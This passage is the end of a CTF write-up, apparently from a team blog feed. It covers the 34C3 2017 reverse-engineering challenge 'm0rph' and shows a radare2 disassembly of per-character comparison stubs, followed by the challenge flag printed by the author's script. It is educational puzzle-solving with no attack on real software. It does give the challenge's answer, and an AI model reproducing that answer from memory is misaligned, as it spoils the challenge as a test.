class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">[0x55769853cb95]&gt; pd 140@ 0x7f3e3151b000</span><br><span class="line">            ;-- rcx:</span><br><span class="line">            ;-- rsi:</span><br><span class="line">            0x7f3e3151b000      56             push rsi</span><br><span class="line">            0x7f3e3151b001      52             push rdx</span><br><span class="line">            0x7f3e3151b002      8a07           mov al, byte [rdi]</span><br><span class="line">            0x7f3e3151b004      3c33           cmp al, 0x33            ; &apos;3&apos; ; 51</span><br><span class="line">        ,=&lt; 0x7f3e3151b006      0f85db020000   jne 0x7f3e3151b2e7</span><br><span class="line">       ,==&lt; 0x7f3e3151b00c      e9b8020000     jmp 0x7f3e3151b2c9</span><br><span class="line">       ||   0x7f3e3151b011      56             push rsi</span><br><span class="line">       ||   0x7f3e3151b012      52             push rdx</span><br><span class="line">       ||   0x7f3e3151b013      8a07           mov al, byte [rdi]</span><br><span class="line">       ||   0x7f3e3151b015      3c34           cmp al, 0x34            ; &apos;4&apos; ; 52</span><br><span class="line">      ,===&lt; 0x7f3e3151b017      0f85ca020000   jne 0x7f3e3151b2e7</span><br><span class="line">     ,====&lt; 0x7f3e3151b01d      e9a7020000     jmp 0x7f3e3151b2c9</span><br><span class="line">     ||||   0x7f3e3151b022      56             push rsi</span><br><span class="line">     ||||   0x7f3e3151b023      52             push rdx</span><br><span class="line">     ||||   0x7f3e3151b024      8a07           mov al, byte [rdi]</span><br><span class="line">     ||||   0x7f3e3151b026      3c43           cmp al, 0x43            ; &apos;C&apos; ; 67</span><br><span class="line">    ,=====&lt; 0x7f3e3151b028      0f85b9020000   jne 0x7f3e3151b2e7</span><br><span class="line">   ,======&lt; 0x7f3e3151b02e      e996020000     jmp 0x7f3e3151b2c9</span><br><span class="line">   ||||||   0x7f3e3151b033      56             push rsi</span><br><span class="line">   ||||||   0x7f3e3151b034      52             push rdx</span><br><span class="line">   ||||||   0x7f3e3151b035      8a07           mov al, byte [rdi]</span><br><span class="line">   ||||||   0x7f3e3151b037      3c33           cmp al, 0x33            ; &apos;3&apos; ; 51</span><br><span class="line">  ,=======&lt; 0x7f3e3151b039      0f85a8020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b03f      e985020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b044      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b045      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b046      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b048      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</span><br><span class="line">  ========&lt; 0x7f3e3151b04a      0f8597020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b050      e974020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b055      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b056      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b057      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b059      3c4d           cmp al, 0x4d            ; &apos;M&apos; ; 77</span><br><span class="line">  ========&lt; 0x7f3e3151b05b      0f8586020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b061      e963020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b066      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b067      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b068      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b06a      3c31           cmp al, 0x31            ; &apos;1&apos; ; 49</span><br><span class="line">  ========&lt; 0x7f3e3151b06c      0f8575020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b072      e952020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b077      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b078      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b079      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b07b      3c47           cmp al, 0x47            ; &apos;G&apos; ; 71</span><br><span class="line">  ========&lt; 0x7f3e3151b07d      0f8564020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b083      e941020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b088      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b089      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b08a      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b08c      3c48           cmp al, 0x48            ; &apos;H&apos; ; 72</span><br><span class="line">  ========&lt; 0x7f3e3151b08e      0f8553020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b094      e930020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b099      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b09a      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b09b      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b09d      3c54           cmp al, 0x54            ; &apos;T&apos; ; 84</span><br><span class="line">  ========&lt; 0x7f3e3151b09f      0f8542020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0a5      e91f020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0aa      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0ab      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0ac      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0ae      3c59           cmp al, 0x59            ; &apos;Y&apos; ; 89</span><br><span class="line">  ========&lt; 0x7f3e3151b0b0      0f8531020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0b6      e90e020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0bb      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0bc      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0bd      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0bf      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</span><br><span class="line">  ========&lt; 0x7f3e3151b0c1      0f8520020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0c7      e9fd010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0cc      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0cd      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0ce      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0d0      3c4d           cmp al, 0x4d            ; &apos;M&apos; ; 77</span><br><span class="line">  ========&lt; 0x7f3e3151b0d2      0f850f020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0d8      e9ec010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0dd      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0de      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0df      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0e1      3c30           cmp al, 0x30            ; &apos;0&apos; ; 48</span><br><span class="line">  ========&lt; 0x7f3e3151b0e3      0f85fe010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0e9      e9db010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0ee      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0ef      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0f0      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0f2      3c52           cmp al, 0x52            ; &apos;R&apos; ; 82</span><br><span class="line">  ========&lt; 0x7f3e3151b0f4      0f85ed010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0fa      e9ca010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0ff      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b100      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b101      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b103      3c50           cmp al, 0x50            ; &apos;P&apos; ; 80</span><br><span class="line">  ========&lt; 0x7f3e3151b105      0f85dc010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b10b      e9b9010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b110      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b111      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b112      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b114      3c68           cmp al, 0x68            ; &apos;h&apos; ; 104</span><br><span class="line">  ========&lt; 0x7f3e3151b116      0f85cb010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b11c      e9a8010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b121      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b122      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b123      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b125      3c31           cmp al, 0x31            ; &apos;1&apos; ; 49</span><br><span class="line">  ========&lt; 0x7f3e3151b127      0f85ba010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b12d      e997010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   ;-- rax:</span><br><span class="line">  |||||||   0x7f3e3151b132      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b133      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b134      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b136      3c6e           cmp al, 0x6e            ; &apos;n&apos; ; 110</span><br><span class="line">  ========&lt; 0x7f3e3151b138      0f85a9010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b13e      e986010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b143      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b144      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b145      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b147      3c47           cmp al, 0x47            ; &apos;G&apos; ; 71</span><br><span class="line">  ========&lt; 0x7f3e3151b149      0f8598010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b14f      e975010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b154      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b155      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b156      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b158      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</span><br><span class="line">  ========&lt; 0x7f3e3151b15a      0f8587010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b160      e964010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b165      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b166      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b167      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b169      3c67           cmp al, 0x67            ; &apos;g&apos; ; 103</span><br><span class="line">  ========&lt; 0x7f3e3151b16b      0f8576010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b171      e953010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b176      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b177      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b178      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b17a      3c30           cmp al, 0x30            ; &apos;0&apos; ; 48</span><br><span class="line">  ========&lt; 0x7f3e3151b17c      0f8565010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b182      e942010000     jmp 0x7f3e3151b2c9</span><br></pre></td></tr></table></figure><p>As you can you can see you can already check the flag and all comparisons that were being made, in my python script I was saving the addresses where each <strong>mini shellcode</strong> starts, so I could sort <strong>the byte order</strong> to get the right flag in the end:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python morph.py</span><br><span class="line">34C3_M1GHTY_M0RPh1nG_g0</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;m0rph 49 Solves: 163&lt;br&gt;&lt;br&gt;To get you started :)&lt;br&gt;&lt;br&gt;files: Link&lt;br&gt;&lt;br&gt;difficulty: easy&lt;br&gt;&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;Openin
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="radare2_script" scheme="https://teamrocketist.github.io/tags/radare2-script/"/>
    
      <category term="mmap" scheme="https://teamrocketist.github.io/tags/mmap/"/>
    
      <category term="34C3ctf2017" scheme="https://teamrocketist.github.io/tags/34C3ctf2017/"/>
    
  </entry>
  
</feed>
